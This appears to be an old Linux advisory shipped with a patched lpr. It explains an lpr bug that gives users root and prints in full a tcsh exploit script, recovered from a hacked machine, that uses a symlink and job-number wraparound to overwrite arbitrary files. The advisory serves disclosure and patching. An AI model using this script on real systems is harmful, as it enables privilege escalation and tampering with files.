ALL current versions of lpr on all distributions have a bug
that can give a regular user root access very easily.

The file "lpr" in this fix directory has this bug fixed, and
should be copied to /usr/bin/lpr (owned by root, group lp, mode 6755)

The file "lpr.c" is the patched source file, that should be copied
to /usr/src/usr.sbin/lpd-5.12/lpr/lpr.c.

The following is a script demonstrating the hole that was found on a 
hacked machine.
--------------------------------------------------------------------
#!/bin/tcsh -f
#
# Usage: lcp from-file to-file
#

if ($#argv != 2) then
        echo Usage: lcp from-file to-file
        exit 1
endif

# This link stuff allows us to overwrite unreadable files,
# should we want to.
echo x > /tmp/.tmp.$$
lpr -q -s /tmp/.tmp.$$
rm -f /tmp/.tmp.$$              # lpr's accepted it, point it
ln -s $2 /tmp/.tmp.$$           # to where we really want

@ s = 0
while ( $s != 999)              # loop 999 times
        lpr /nofile >&/dev/null # spin the job number till it wraps!
        @ s++
        if ( $s % 10 == 0 ) echo -n .
end
lpr $1                          # write source file over old data file
                                # user becomes owner
rm -f /tmp/.tmp.$$
exit 0

